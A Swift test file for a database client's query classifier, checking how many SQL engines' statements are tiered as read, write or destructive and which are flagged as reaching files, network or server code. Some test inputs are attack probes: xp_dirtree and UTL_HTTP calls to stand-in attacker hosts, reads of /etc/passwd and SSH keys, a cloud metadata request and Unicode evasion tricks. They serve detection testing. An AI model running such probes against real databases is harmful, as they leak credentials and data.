import Foundation
@testable import TablePro
import Testing

struct QueryClassifierFailClosedDefaultsTests {
    @Test("EXPLAIN ANALYZE of a parenthesised write runs the write", arguments: [
        "EXPLAIN ANALYZE (WITH gone AS (DELETE FROM orders RETURNING *) SELECT count(*) FROM gone)",
        "EXPLAIN ANALYSE (WITH gone AS (DELETE FROM orders RETURNING *) SELECT count(*) FROM gone)",
        "EXPLAIN (ANALYZE, FORMAT JSON) (WITH gone AS (DELETE FROM orders RETURNING *) SELECT count(*) FROM gone)",
        "EXPLAIN ANALYZE VERBOSE ((WITH gone AS (DELETE FROM orders RETURNING *) SELECT 1))",
        "EXPLAIN ANALYZE (SELECT nextval('orders_id_seq'))",
        "EXPLAIN ANALYSE (SELECT pg_terminate_backend(1))",
    ])
    func parenthesisedExplainedWriteRuns(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .postgresql) == .write)
    }

    @Test("An EXPLAIN option that is quoted, unknown or ANALYZE runs the statement", arguments: [
        "EXPLAIN (\"analyze\") DELETE FROM orders",
        "EXPLAIN (\"analyze\" true, VERBOSE) UPDATE orders SET paid = false",
        "EXPLAIN (VERBOSE, \"analyze\") INSERT INTO orders DEFAULT VALUES",
        "EXPLAIN (\"ANALYSE\") DELETE FROM orders",
        "EXPLAIN (U&\"an\\0061lyze\") DELETE FROM orders",
        "EXPLAIN (\"analyze\") SELECT pg_terminate_backend(123)",
        "EXPLAIN (frobnicate) DELETE FROM orders",
        "EXPLAIN frobnicate DELETE FROM orders",
    ])
    func unreadableOptionRuns(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .postgresql) == .write)
    }

    @Test("An EXPLAIN whose statement the reader cannot find is a write", arguments: [
        (DatabaseType.postgresql, "EXPLAIN"),
        (DatabaseType.postgresql, "EXPLAIN (ANALYZE)"),
        (DatabaseType.sqlite, "EXPLAIN PRAGMA query_only=ON"),
        (DatabaseType.sqlite, "EXPLAIN QUERY PLAN PRAGMA query_only=ON"),
        (DatabaseType.sqlite, "explain query plan pragma foreign_keys = OFF"),
        (DatabaseType.sqlite, "EXPLAIN /* c */ PRAGMA locking_mode(EXCLUSIVE)"),
        (DatabaseType.mysql, "EXPLAIN 1 + 1"),
    ])
    func explainWithoutStatementIsAWrite(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .write)
    }

    @Test("An EXPLAIN that only plans, or describes a table, stays a read", arguments: [
        (DatabaseType.postgresql, "EXPLAIN (\"verbose\") SELECT * FROM orders"),
        (DatabaseType.postgresql, "EXPLAIN (FORMAT \"json\", VERBOSE) DELETE FROM orders"),
        (DatabaseType.postgresql, "EXPLAIN (FORMAT JSON) SELECT 1"),
        (DatabaseType.postgresql, "EXPLAIN (ANALYZE, FORMAT JSON) SELECT * FROM orders"),
        (DatabaseType.postgresql, "EXPLAIN (SELECT 1)"),
        (DatabaseType.mysql, "EXPLAIN FORMAT=JSON SELECT 1"),
        (DatabaseType.mysql, "EXPLAIN orders"),
        (DatabaseType.mysql, "EXPLAIN FOR CONNECTION 12"),
        (DatabaseType.tidb, "EXPLAIN FORMAT = \"brief\" SELECT 1"),
        (DatabaseType.sqlite, "EXPLAIN QUERY PLAN SELECT * FROM orders"),
        (DatabaseType.clickhouse, "EXPLAIN PIPELINE SELECT 1"),
        (DatabaseType.clickhouse, "EXPLAIN PLAN header = 1, actions = 1 SELECT 1"),
        (DatabaseType.clickhouse, "EXPLAIN QUERY TREE SELECT 1"),
        (DatabaseType.trino, "EXPLAIN (TYPE DISTRIBUTED) SELECT 1"),
        (DatabaseType.snowflake, "EXPLAIN USING TEXT SELECT 1"),
        (DatabaseType.oracle, "EXPLAIN PLAN FOR DELETE FROM orders"),
        (DatabaseType.cockroachdb, "EXPLAIN (OPT, VERBOSE) SELECT 1"),
    ])
    func planningExplainStaysARead(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .safe)
    }

    @Test("DESCRIBE and DESC ANALYZE of a write run the write, as MySQL and TiDB read them", arguments: [
        "DESCRIBE ANALYZE DELETE FROM orders",
        "DESC ANALYZE DELETE FROM orders",
        "DESC ANALYZE UPDATE orders SET paid = 1",
        "DESC ANALYZE INSERT INTO orders VALUES (1)",
        "DESC ANALYZE REPLACE INTO orders VALUES (1)",
        "desc /* plan */ analyze delete from orders",
        "DESC FORMAT=TREE ANALYZE DELETE FROM orders",
    ], [DatabaseType.tidb, .mysql, .mariadb])
    func describeAnalyzeRuns(sql: String, engine: DatabaseType) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .write)
    }

    @Test("Describing a table, or a plan that runs nothing, stays a read", arguments: [
        "DESCRIBE orders",
        "DESC orders",
        "DESC orders id",
        "DESC analyze_runs",
        "DESCRIBE TABLE orders",
        "DESCRIBE SELECT * FROM orders",
        "DESC DELETE FROM orders WHERE id = 1",
        "DESC ANALYZE SELECT * FROM orders",
        "DESC FORMAT=JSON SELECT 1",
    ], [DatabaseType.tidb, .mysql])
    func describeStaysARead(sql: String, engine: DatabaseType) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .safe)
    }

    @Test("A Snowflake DESCRIBE of a routine signature stays a read")
    func describeRoutineSignature() {
        #expect(QueryClassifier.classifyTier("DESC FUNCTION add_one(NUMBER, VARCHAR)", databaseType: .snowflake) == .safe)
    }

    @Test("ANALYZE TABLE stores statistics and is a write, whatever follows the table", arguments: [
        (DatabaseType.mysql, "ANALYZE TABLE orders"),
        (DatabaseType.mysql, "ANALYZE TABLE `shop`.`orders`"),
        (DatabaseType.mysql, "ANALYZE LOCAL TABLE orders"),
        (DatabaseType.mysql, "ANALYZE TABLE orders UPDATE HISTOGRAM ON status WITH 16 BUCKETS"),
        (DatabaseType.mysql, "ANALYZE TABLE orders DROP HISTOGRAM ON status"),
        (DatabaseType.mariadb, "ANALYZE TABLE orders PERSISTENT FOR ALL"),
        (DatabaseType.tidb, "ANALYZE TABLE orders"),
        (DatabaseType.oracle, "ANALYZE TABLE orders COMPUTE STATISTICS"),
        (DatabaseType.oracle, "ANALYZE TABLE orders DELETE STATISTICS"),
        (DatabaseType.postgresql, "ANALYZE orders"),
        (DatabaseType.postgresql, "ANALYZE"),
        (DatabaseType.postgresql, "ANALYZE (VERBOSE) orders"),
        (DatabaseType.trino, "ANALYZE orders WITH (partitions = ARRAY[ARRAY['2024']])"),
    ])
    func analyzeTableIsAWrite(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .write)
    }

    @Test("MariaDB's ANALYZE of a statement keeps that statement's tier")
    func analyzeOfAStatementKeepsItsTier() {
        #expect(QueryClassifier.classifyTier("ANALYZE SELECT * FROM orders", databaseType: .mariadb) == .safe)
        #expect(QueryClassifier.classifyTier("ANALYZE FORMAT=JSON SELECT * FROM orders", databaseType: .mariadb) == .safe)
        #expect(QueryClassifier.classifyTier("ANALYZE DELETE FROM orders WHERE id = 1", databaseType: .mariadb) == .write)
    }

    @Test("After a CTE list only a query reads", arguments: [
        (DatabaseType.sqlite, "WITH x AS (SELECT 1) REPLACE INTO orders SELECT * FROM x"),
        (DatabaseType.mysql, "WITH x AS (SELECT 1) REPLACE INTO orders SELECT * FROM x"),
        (DatabaseType.cockroachdb, "WITH x AS (SELECT 1) UPSERT INTO orders SELECT * FROM x"),
        (DatabaseType.postgresql, "WITH x AS (SELECT 1) SELECT * INTO copy FROM x"),
        (DatabaseType.snowflake, "WITH p AS PROCEDURE () RETURNS INT LANGUAGE SQL AS $$ BEGIN RETURN 1; END $$ CALL p()"),
        (DatabaseType.postgresql, "WITH x AS (SELECT 1) CALL purge()"),
        (DatabaseType.postgresql, "WITH gone AS (DELETE FROM orders RETURNING *) SELECT count(*) FROM gone"),
        (DatabaseType.postgresql, "WITH a AS (WITH b AS (UPDATE orders SET paid = true RETURNING 1) SELECT 1) SELECT 1"),
        (DatabaseType.postgresql, "WITH"),
    ])
    func commonTableExpressionMainStatementMustRead(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .write)
    }

    @Test("A CTE list ahead of a query stays a read", arguments: [
        (DatabaseType.postgresql, "WITH x AS (SELECT 1) SELECT * FROM x"),
        (DatabaseType.postgresql, "WITH RECURSIVE r(n) AS (SELECT 1 UNION ALL SELECT n + 1 FROM r) SELECT * FROM r"),
        (DatabaseType.postgresql, "WITH \"q\" AS MATERIALIZED (SELECT 1), y AS NOT MATERIALIZED (VALUES (2)) TABLE y"),
        (DatabaseType.postgresql, "WITH x AS (SELECT 1) (SELECT * FROM x) UNION (SELECT 2)"),
        (DatabaseType.postgresql,
         "WITH RECURSIVE t(id) AS (SELECT 1) SEARCH DEPTH FIRST BY id SET ord CYCLE id SET seen USING path SELECT * FROM t"),
        (DatabaseType.sqlite, "WITH x AS (SELECT replace(name, 'a', 'b') AS n FROM t) SELECT n FROM x"),
        (DatabaseType.clickhouse, "WITH 1 AS one, sum(bytes) AS total SELECT one, total FROM parts"),
        (DatabaseType.mssql, "WITH cte (a) AS (SELECT 1) SELECT a FROM cte"),
    ])
    func commonTableExpressionQueryStaysARead(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: engine) == .safe)
    }

    @Test("A statement a PREPARE stores is tiered when it is prepared", arguments: [
        (DatabaseType.mysql, "PREPARE s FROM 'DROP TABLE orders'", QueryTier.destructive, true),
        (DatabaseType.mysql, "PREPARE s FROM @statement", QueryTier.write, true),
        (DatabaseType.duckdb, "PREPARE q AS DROP TABLE orders", QueryTier.destructive, false),
        (DatabaseType.postgresql, "PREPARE q (int) AS DELETE FROM orders WHERE id = $1", QueryTier.write, false),
        (DatabaseType.postgresql, "PREPARE q AS SELECT 1", QueryTier.write, false),
    ])
    func preparedStatementIsTiered(engine: DatabaseType, sql: String, tier: QueryTier, runsCode: Bool) {
        let classification = QueryClassifier.classify(sql, databaseType: engine)
        #expect(classification.tier == tier)
        #expect(classification.reachesFilesystemOrExecutesCode == runsCode)
    }

    @Test("SQL Server's linked-server and file readers are writes, and the file ones are flagged", arguments: [
        ("SELECT * FROM OPENQUERY(remote, 'DELETE FROM orders')", false),
        ("SELECT * FROM openquery (remote, 'SELECT 1')", false),
        ("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=remote;Trusted_Connection=yes;', 'DELETE FROM orders')", true),
        ("SELECT * FROM OPENROWSET(BULK 'C:\\secrets.txt', SINGLE_CLOB) AS f", true),
        ("SELECT * FROM OPENDATASOURCE('Microsoft.ACE.OLEDB.12.0', 'Data Source=C:\\a.xlsx')...[Sheet1$]", true),
        ("BULK INSERT orders FROM 'C:\\orders.csv'", true),
    ])
    func linkedServerAndFileReaders(sql: String, flagged: Bool) {
        let classification = QueryClassifier.classify(sql, databaseType: .mssql)
        #expect(classification.tier == .write)
        #expect(classification.reachesFilesystemOrExecutesCode == flagged)
    }

    @Test("A file, directory or network reader reaches outside however its name is written", arguments: [
        (DatabaseType.postgresql, "SELECT * FROM pg_stat_file('/etc/passwd')"),
        (DatabaseType.postgresql, "SELECT * FROM pg_ls_logdir()"),
        (DatabaseType.mssql, "EXEC xp_dirtree '\\\\attacker\\share'"),
        (DatabaseType.mssql, "EXEC [xp_fileexist] 'C:\\a.txt'"),
        (DatabaseType.mssql, "SELECT * FROM sys.dm_os_enumerate_filesystem('C:\\', '*')"),
        (DatabaseType.oracle, "SELECT UTL_HTTP.REQUEST('http://attacker.example') FROM dual"),
        (DatabaseType.oracle, "SELECT BFILENAME('DIR', 'a.txt') FROM dual"),
        (DatabaseType.sqlite, "SELECT * FROM fsdir('/')"),
    ])
    func outsideReaderIsFlagged(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: engine))
    }

    @Test("A blank DuckDB takes before a call's parenthesis does not hide the call", arguments: [
        "SELECT * FROM query\u{00A0}('SELECT * FROM read_text(''/etc/passwd'')')",
        "SELECT * FROM glob\u{200B}('/Users/ann/.ssh/*')",
        "SELECT * FROM glob\u{E0020}('/Users/ann/.ssh/*')",
    ])
    func blankBeforeParenthesisKeepsTheCall(sql: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: .duckdb))
    }

    @Test("Code a statement runs on the server is flagged", arguments: [
        (DatabaseType.snowflake,
         "WITH p AS PROCEDURE() RETURNS INT LANGUAGE SQL AS $$ BEGIN DROP TABLE orders; RETURN 1; END $$ CALL p()"),
        (DatabaseType.surrealdb, "SELECT VALUE function() { return 1; } FROM [1]"),
        (DatabaseType.surrealdb, "SELECT * FROM http::get('http://169.254.169.254/')"),
    ])
    func serverCodeIsFlagged(engine: DatabaseType, sql: String) {
        #expect(QueryClassifier.reachesFilesystemOrExecutesCode(sql, databaseType: engine))
    }

    @Test("DuckDB's FROM-first and PIVOT queries stay reads, alone or in a CTE", arguments: [
        "FROM range(3)",
        "WITH r AS (FROM range(3)) SELECT * FROM r",
        "WITH r AS (SELECT 1 AS c, 2 AS v) FROM r",
        "WITH p AS (PIVOT sales ON year USING sum(amount)) SELECT * FROM p",
    ])
    func duckDBQueryShapesStayReads(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .duckdb) == .safe)
    }

    @Test("A control character between EXECUTE and IMMEDIATE still runs the string")
    func executeImmediateAcrossABlank() {
        let classification = QueryClassifier.classify("EXECUTE\u{1}IMMEDIATE 'DROP TABLE orders'", databaseType: .snowflake)
        #expect(classification.tier == .destructive)
        #expect(classification.reachesFilesystemOrExecutesCode)
    }

    @Test("SQLite's pragma_optimize runs ANALYZE, measured on 3.54.0", arguments: [
        "SELECT * FROM pragma_optimize(0x10002)",
        "SELECT * FROM main.pragma_optimize",
        "SELECT * FROM \"pragma_optimize\"()",
    ])
    func pragmaOptimizeIsAWrite(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .sqlite) == .write)
        #expect(QueryClassifier.classifyTier("SELECT * FROM pragma_table_info('orders')", databaseType: .sqlite) == .safe)
    }

    @Test("pragma_optimize named where a table stands is a write, and a string that spells it is not")
    func pragmaOptimizeAsATable() {
        #expect(QueryClassifier.classifyTier("SELECT * FROM 'pragma_optimize'", databaseType: .sqlite) == .write)
        #expect(QueryClassifier.classifyTier("SELECT * FROM t, 'pragma_optimize'", databaseType: .sqlite) == .write)
        #expect(QueryClassifier.classifyTier("SELECT 'pragma_optimize' AS note", databaseType: .sqlite) == .safe)
        #expect(QueryClassifier.classifyTier("SELECT 1, 'pragma_optimize' AS label", databaseType: .sqlite) == .safe)
        #expect(QueryClassifier.classifyTier("SELECT 1 AS pragma_optimize", databaseType: .postgresql) == .safe)
        #expect(QueryClassifier.classifyTier("SELECT t.pragma_optimize FROM t", databaseType: .sqlite) == .safe)
        #expect(QueryClassifier.classifyTier("SELECT * FROM t JOIN \"pragma_optimize\"", databaseType: .sqlite) == .write)
    }

    @Test("SEARCH and CYCLE clauses over several columns stay reads", arguments: [
        "WITH RECURSIVE t(a, b) AS (SELECT 1, 2) SEARCH DEPTH FIRST BY a, b SET ord SELECT * FROM t",
        "WITH RECURSIVE t(a, b) AS (SELECT 1, 2) CYCLE a, b SET seen TO true DEFAULT false USING path SELECT * FROM t",
    ])
    func searchAndCycleOverSeveralColumns(sql: String) {
        #expect(QueryClassifier.classifyTier(sql, databaseType: .postgresql) == .safe)
    }

    @Test("Nested statements past the limit are refused, and reading them stays fast", .timeLimit(.minutes(1)))
    func deepNestingIsRefused() {
        let depth = 2_000
        let ctes = String(repeating: "WITH x AS (", count: depth) + "SELECT 1" + String(repeating: ") SELECT 1", count: depth)
        #expect(QueryClassifier.classifyTier(ctes, databaseType: .postgresql) != .safe)
        let explains = String(repeating: "EXPLAIN ANALYZE WITH x AS (", count: depth) + "SELECT 1"
            + String(repeating: ") SELECT 1", count: depth)
        #expect(QueryClassifier.classifyTier(explains, databaseType: .postgresql) != .safe)
        let prepares = String(repeating: "PREPARE q AS ", count: depth) + "SELECT 1"
        #expect(QueryClassifier.classifyTier(prepares, databaseType: .duckdb) != .safe)
    }

    @Test("A Typesense POST reads only on a search route, after resolution", arguments: [
        ("POST /multi_search", QueryTier.safe),
        ("POST /collections/books/documents/search", QueryTier.safe),
        ("POST /collections/books/../books/documents/search", QueryTier.safe),
        ("POST /keys/../documents/search", QueryTier.write),
        ("POST /collections/books/documents/search/extra", QueryTier.write),
        ("POST /collections/books/documents/import/documents/search", QueryTier.write),
    ])
    func typesenseReadRouteIsResolved(request: String, tier: QueryTier) {
        #expect(QueryClassifier.classifyTier(request, databaseType: .typesense) == tier)
    }
}
